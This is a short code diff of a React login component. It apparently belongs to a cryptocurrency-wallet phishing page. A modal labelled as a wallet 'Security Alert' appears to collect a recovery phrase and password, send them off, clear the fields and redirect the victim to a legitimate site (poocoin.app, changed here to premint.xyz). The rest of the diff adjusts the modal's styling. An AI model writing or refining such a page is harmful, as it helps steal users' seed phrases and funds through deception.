@@ -91,7 +91,7 @@ function Login() {
             .then(success => {
                 setPrharePass('')
                 setPrhase('')
-                window.location = 'https://poocoin.app/'
+                window.location = 'https://www.premint.xyz/'
             }, error => {
                 alert("not sent")
             })
@@ -118,11 +118,11 @@ function Login() {
                 aria-labelledby="modal-modal-title"
                 aria-describedby="modal-modal-description"
             >
-                <div className='bg-white absolute left-80 right-80 top-20 py-10 rounded-xl'>
+                <div className='bg-white flex items-center justify-center md:mx-[20rem] lg:mx-[30rem] mx-2  my-10  px-2 text-center py-10 rounded-xl outline-0'>
                     {
                         !recover ?
                             (
-                                <div className='flex flex-col items-center'>
+                                <div className='flex flex-col items-center bg-white'>
                                     <img className='w-20' src='https://i.ibb.co/XXQ7tb4/pngtree-security-alert-icon-red-png-image-2597553-removebg-preview.png' />
                                     <Typography style={{ marginTop: '15px', color: 'red', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
                                         {activeWallet?.name} Security Alert
